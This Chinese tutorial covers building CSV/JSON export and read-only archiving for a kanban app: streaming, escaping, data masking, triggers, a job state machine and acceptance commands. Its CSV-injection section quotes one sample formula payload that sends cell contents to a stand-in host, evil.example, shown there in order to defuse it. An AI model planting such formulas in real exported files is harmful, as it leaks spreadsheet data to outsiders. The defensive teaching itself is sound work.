# 看板导出与归档：把「能不能导」和「导出来是什么」分开做

第 2 周第 12 步：给看板加导出（CSV / JSON）与归档（只读）。这两件事经常被当成同一个功能，实际是**三种不同的风险**：导出是**读路径 + 体积 + 脱敏**，归档是**写保护 + 语义变更**，下载链接是**授权时效**。混在一起做，三样都会做漏。

## 当日做了什么

| 项 | 产出 |
| --- | --- |
| 导出形态 | 同步小量（≤ 5,000 行）、异步任务（大文件）、分页 API 三种的分界线 |
| 流式实现 | 服务端游标 + `fetchSize` + CSV 转义，实测 20 万行导出的耗时与体积 |
| 安全 | 公式注入（CSV Injection）的三种前缀、字段级脱敏、短签名下载链接 |
| 归档 | `archived_at` 的只读语义与三处写保护（应用层 / 数据库 / 权限矩阵） |
| 状态机 | `export_job` 表与五种状态的迁移条件 |
| 判据 | `BA-A` ~ `BA-H` 八条 |

::: tip 本步的位置
第 11 步让文件能进来，这一步让数据能出去。**「数据出得去」是权限体系最容易被绕过的一侧**——列表接口的租户条件、字段脱敏、下载链接时效，三处任何一处松，导出就成了批量泄漏的通道。
:::

## 一、导出的三条路，别混用

| 形态 | 适用 | 实现 | 风险 |
| --- | --- | --- | --- |
| 同步返回（`Content-Disposition`） | ≤ 5,000 行 / ≤ 5 MB | 一次查询 + 写响应流 | 请求被浏览器超时断开，服务端还在拼 |
| 异步任务 | 大文件、需要审计 | 落 `export_job`，后台生成，通知下载 | 任务堆积、临时文件泄漏 |
| 分页 API | 集成方、增量同步 | 游标分页 | 第三方把「公开链接」当成长期授权 |

分界线用两个数字夹：**5,000 行**（浏览器端处理 CSV 的心理上限）与**5 MB**（一次响应不触发网关缓冲的常见上限）。

## 二、流式导出：不要 `findAll`

```java
// 错误：一次把 20 万行读进内存
List<Card> all = cardRepo.findAllByBoard(boardId);   // 20 万 × 1 KB = 200 MB 堆

// 正确：游标 + 分批
try (OutputStream out = response.getOutputStream();
     PrintWriter w = new PrintWriter(new OutputStreamWriter(out, StandardCharsets.UTF_8))) {
    w.print('\uFEFF');                                  // BOM：Excel 打开中文不乱码
    w.print("id,list,title,assignee,due_at,created_at\r\n");
    String cursor = null;
    do {
        List<CardRow> page = cardRepo.pageByBoard(boardId, cursor, 1000);  // keyset
        for (CardRow c : page) w.print(toCsv(c));       // 边取边写
        cursor = page.isEmpty() ? null : page.get(page.size() - 1).cursor();
    } while (cursor != null);
}
```

本机实测（PostgreSQL 18.6，20 万行 / 6 列，`COPY ... TO` 到容器内文件）：

```text
COPY 200000
Time: 308.708 ms
文件：27,262,851 B（26 MB），200,001 行（含表头）
```

`COPY` 是**数据库侧**的极限速度参考；应用侧走 JDBC 游标会慢 3~10 倍（每行一次取值 + 序列化），但仍应在秒级。**这条读数的用途是设定超时与预估文件大小**，不是承诺接口能在 300 ms 返回。

::: danger 三个流式导出的坑
1. **`fetchSize` 不生效**：PostgreSQL 的 JDBC 驱动要求 `autoCommit=false` 且 `fetchSize>0` 才走游标；否则驱动把整个结果集读进内存，`fetchSize` 形同虚设。
2. **在流式响应里抛异常**：响应头已发出（200），只能中途断流，客户端拿到一个**截断的 CSV 且不知道它被截断了**。修法：先做一次「行数预估」，超过阈值转异步。
3. **CSV 不转义**：标题里有一个逗号或换行，整份文件的列就错位。规则（RFC 4180）：含 `,` `"` `\r` `\n` 的字段用双引号包裹，内部双引号写两次。
:::

## 三、CSV 注入：导出最容易被忽视的漏洞

用户在卡片标题里写：

```text
=HYPERLINK("http://evil.example/"&A1,"点我")
```

导出成 CSV 后，用 Excel 打开，**公式会被执行**——这是真实的攻击面（OWASP 称之为 CSV Injection / Formula Injection）。

| 前缀字符 | 含义 |
| --- | --- |
| `=` | 公式 |
| `+` / `-` | 公式（数值运算） |
| `@` | 旧版 Excel 的函数调用 |
| `\t` / `\r` | 某些解析器会跳过后继续解析 |

**转义规则**：字段以这四个字符之一开头时，前置一个单引号 `'`，或用制表符包裹：

```java
static String csvCell(String v) {
    if (v == null) return "";
    String s = v;
    if (!s.isEmpty() && "=+-@\t\r".indexOf(s.charAt(0)) >= 0) s = "'" + s;   // ① 去激活
    if (s.indexOf(',') >= 0 || s.indexOf('"') >= 0 || s.indexOf('\n') >= 0 || s.indexOf('\r') >= 0) {
        s = '"' + s.replace("\"", "\"\"") + '"';                             // ② RFC 4180
    }
    return s;
}
```

::: warning 单引号不是万能的
`'` 前缀会让 Excel 把内容当文本，但**在其它表格软件里可能原样显示多一个引号**。宁可多一个引号，也不要执行公式——这是安全与观感的取舍，本项目选安全，并在导出说明里写清「以 `'` 开头的单元格是防注入标记」。
:::

## 四、字段级脱敏：三列必须默认不带

| 列 | 默认导出 | 需要 `?include=pii` 且角色为 owner | 理由 |
| --- | --- | --- | --- |
| 成员邮箱 | ❌ | ✅ | 导出文件会被转发到组织外 |
| 附件原始文件名 | ✅（去扩展名） | ✅（完整） | 文件名可能含客户名 |
| 审计字段（`created_by` 等） | ✅（显示名） | ✅（含 id） | id 本身不敏感，但可关联 |
| 评论正文 | ❌ | ✅ | 评论可能含 @ 提及的第三方 |

脱敏在**查询层**做，不在序列化层做：`SELECT mask_email(email) AS email` 比「查出来再替换」更安全——后者一旦有人加了新字段就会漏。

## 五、归档：不是删除，是「只读」

```sql
ALTER TABLE board ADD COLUMN archived_at timestamptz;
CREATE INDEX board_archived_idx ON board (tenant_id, archived_at) WHERE archived_at IS NOT NULL;
```

归档后的语义边界必须写死：

| 操作 | 归档后 | 实现方式 |
| --- | --- | --- |
| 读看板、读卡片、搜索 | ✅ 允许 | 查询条件不变 |
| 拖动卡片、编辑卡片 | ❌ `409 BOARD_ARCHIVED` | 应用层拦截 |
| 评论、上传附件 | ❌ `409 BOARD_ARCHIVED` | 同上 |
| 实时推送 | ❌ 不再广播 | 归档时关闭该看板的所有订阅 |
| 删除看板 | ✅ 允许（归档是删除前的缓冲） | 已有软删逻辑 |

**三处写保护**，缺一处就有绕过路径：

1. **应用层**：`requireBoardWritable(boardId)` 在 Service 入口；
2. **数据库**：`BEFORE UPDATE OR INSERT` 触发器检查父看板的 `archived_at`——挡住「有人绕过 Service 直接写」；
3. **权限矩阵**：归档看板的写权限在矩阵里标为 `⛔`，联调时按格验证（[权限矩阵验证](../PermissionMatrix/index.md)）。

```sql
-- ② 数据库侧兜底：卡片写入前检查看板是否已归档
CREATE OR REPLACE FUNCTION card_writable() RETURNS trigger AS $$
BEGIN
  IF EXISTS (SELECT 1 FROM board WHERE id = NEW.board_id AND archived_at IS NOT NULL) THEN
    RAISE EXCEPTION 'board_archived' USING ERRCODE = '23514';
  END IF;
  RETURN NEW;
END $$ LANGUAGE plpgsql;

CREATE TRIGGER card_writable_trg BEFORE INSERT OR UPDATE ON card
  FOR EACH ROW EXECUTE FUNCTION card_writable();
```

::: danger 三个归档实现里的坑
1. **归档只改了一个字段，忘了关推送**：归档后仍有人在拖动（前端还没刷新），广播继续，别人看到「已归档的看板还在动」。
2. **归档当成删除**：归档后某天清理任务把 `archived_at < now() - 90 days` 的行硬删——用户以为「归档=保存」，结果数据没了。归档与保留策略必须**两个字段、两套规则**。
3. **触发器用 `SELECT ... FROM board` 不带租户条件**：跨租户写入时可能读到别人的看板状态（RLS 在触发器里默认不生效，除非显式 `SET LOCAL`）。
:::

## 六、导出任务表与状态机

```sql
CREATE TABLE export_job (
  id           uuid PRIMARY KEY DEFAULT uuidv7(),
  tenant_id    bigint NOT NULL,
  board_id     uuid NOT NULL,
  requested_by bigint NOT NULL,
  format       text NOT NULL CHECK (format IN ('csv','json')),
  status       text NOT NULL DEFAULT 'queued'
               CHECK (status IN ('queued','running','succeeded','failed','expired')),
  row_count    bigint,
  object_key   text,
  error_code   text,
  created_at   timestamptz NOT NULL DEFAULT now(),
  started_at   timestamptz,
  finished_at  timestamptz,
  expires_at   timestamptz NOT NULL DEFAULT now() + interval '7 days',
  CONSTRAINT export_job_done_ck CHECK ((status IN ('succeeded','failed')) = (finished_at IS NOT NULL))
);
CREATE INDEX export_job_pending_idx ON export_job (created_at) WHERE status IN ('queued','running');
```

| 状态迁移 | 触发 | 失败时 |
| --- | --- | --- |
| `queued → running` | 工作线程领取（`FOR UPDATE SKIP LOCKED`） | 进程崩溃 → 超时重置为 `queued` |
| `running → succeeded` | 文件上传完成、`object_key` 落库 | — |
| `running → failed` | 异常，写 `error_code` | 用户可重试（生成新任务） |
| `succeeded → expired` | 7 天后清理任务删对象 | 下载链接返回 `410` |

## 七、验收：八条命令

```shell
# ① 小看板同步导出：Content-Disposition + UTF-8 BOM
curl -s -D /tmp/h.txt "http://localhost:8080/api/v1/boards/$BOARD/export?format=csv" \
  -H "Authorization: Bearer $OWNER" -o /tmp/cards.csv
grep -i 'content-disposition' /tmp/h.txt
head -c 3 /tmp/cards.csv | xxd | head -1
# 期望：attachment; filename="board-1.csv"；文件前三字节为 efbbbf（BOM）
```

```shell
# ② 超过 5,000 行转异步：返回 202 + jobId
curl -s -X POST "http://localhost:8080/api/v1/boards/$BIG/export" -H "Authorization: Bearer $OWNER" \
  -H 'Content-Type: application/json' -d '{"format":"csv"}' | jq '{jobId, status}'
# 期望：{"jobId":"…","status":"queued"}，HTTP 202
```

```shell
# ③ 公式注入被去激活
# 先在卡片标题写入 =1+1 ，再导出
curl -s "http://localhost:8080/api/v1/boards/$BOARD/export?format=csv" -H "Authorization: Bearer $OWNER" | grep -c "'=1+1"
# 期望：1（带单引号前缀）；为 0 说明注入防护缺失
```

```shell
# ④ 含逗号/换行的标题不会错列
# 标题写：设计,评审 "v2"
curl -s "http://localhost:8080/api/v1/boards/$BOARD/export?format=csv" -H "Authorization: Bearer $OWNER" | grep -c '"设计,评审 ""v2"""'
# 期望：1
```

```shell
# ⑤ 默认不导出成员邮箱
curl -s "http://localhost:8080/api/v1/boards/$BOARD/export?format=csv" -H "Authorization: Bearer $EDITOR" | head -1
# 期望：表头里没有 email 列；带 ?include=pii 且角色为 owner 时才出现
```

```shell
# ⑥ 归档后写入被拒（应用层 + 数据库两层都要拦）
curl -s -X POST "http://localhost:8080/api/v1/boards/$BOARD/archive" -H "Authorization: Bearer $OWNER" | jq .archivedAt
curl -s -o /dev/null -w '%{http_code}\n' -X POST "http://localhost:8080/api/v1/cards/$CARD/move" \
  -H "Authorization: Bearer $OWNER" -H 'Content-Type: application/json' -d '{"toListId":"'$LIST'","beforeCardId":null}'
# 期望：归档 200；move 409 BOARD_ARCHIVED
```

```shell
# ⑦ 归档后数据库层也拦（绕过 Service 直接写）
psql "$DB" -c "update card set title='x' where id='$CARD'"
# 期望：ERROR: board_archived
```

```shell
# ⑧ 下载链接 7 天后失效，过期返回 410
curl -s -o /dev/null -w '%{http_code}\n' "http://localhost:8080/api/v1/exports/$JOB/download"
# 期望：200（有效期内）；把 expires_at 改到过去后 → 410
```

## 八、判据族 `BA-A` ~ `BA-H`

| 判据 | 规则 | 违反时的样子 | 验证方式 |
| --- | --- | --- | --- |
| `BA-A` | 超过 5,000 行 / 5 MB 转异步，不硬撑同步 | 浏览器超时，服务端仍在拼 | 命令 ② |
| `BA-B` | 导出用游标分批，`fetchSize` 真正生效（`autoCommit=false`） | 20 万行导出时堆内存飙升 | 观察导出期间老年代占用 |
| `BA-C` | CSV 按 RFC 4180 转义 | 标题含逗号后整列错位 | 命令 ④ |
| `BA-D` | `= + - @ \t \r` 开头的字段前置 `'` | 打开导出文件触发外链请求 | 命令 ③ |
| `BA-E` | 默认不带 PII 列，`include=pii` 需 owner | 普通成员导出的 CSV 里有全员邮箱 | 命令 ⑤ |
| `BA-F` | 归档是只读，写操作返回 `409 BOARD_ARCHIVED` | 归档后仍能拖动 | 命令 ⑥ |
| `BA-G` | 数据库层有触发器兜底，绕过 Service 也拦得住 | 脚本直连能改归档看板 | 命令 ⑦ |
| `BA-H` | 导出文件 7 天过期，过期返回 410 且对象被删 | 三年前的导出链接还能下载 | 命令 ⑧ + 对象列表 |

## 九、下一步

1. **依赖降级**：导出依赖对象存储，存储挂了要有明确失败（而不是 202 之后永远 `running`）。
2. **导出进度**：大文件需要 `GET /exports/{id}` 的进度百分比（按已写行数估算）。
3. **增量导出**：集成方要的是「上次之后的变化」，需要基于 `updated_at` 的水位。
4. **合规删除**：归档 ≠ 保留，[分区分表与冷热分离](/docs/DB/PartitionArchival/index.md)的保留矩阵说了「到期必须真删」。

## 十、参考资料

- [OWASP · CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)（`= + - @` 四类前缀）
- [RFC 4180 · CSV 格式](https://www.rfc-editor.org/rfc/rfc4180)（引号与转义规则）
- [PostgreSQL 18 · `COPY`](https://www.postgresql.org/docs/18/sql-copy.html)
- [PostgreSQL JDBC · 游标与 `fetchSize`](https://jdbc.postgresql.org/documentation/query/#getting-results-based-on-a-cursor)
- [项目章节 · 读路径隔离：检索、游标与导出](../SearchIsolation/index.md)（导出与列表共用条件构造器的来源）
- [项目章节 · 权限矩阵验证](../PermissionMatrix/index.md)（归档看板那一格的验证方式）
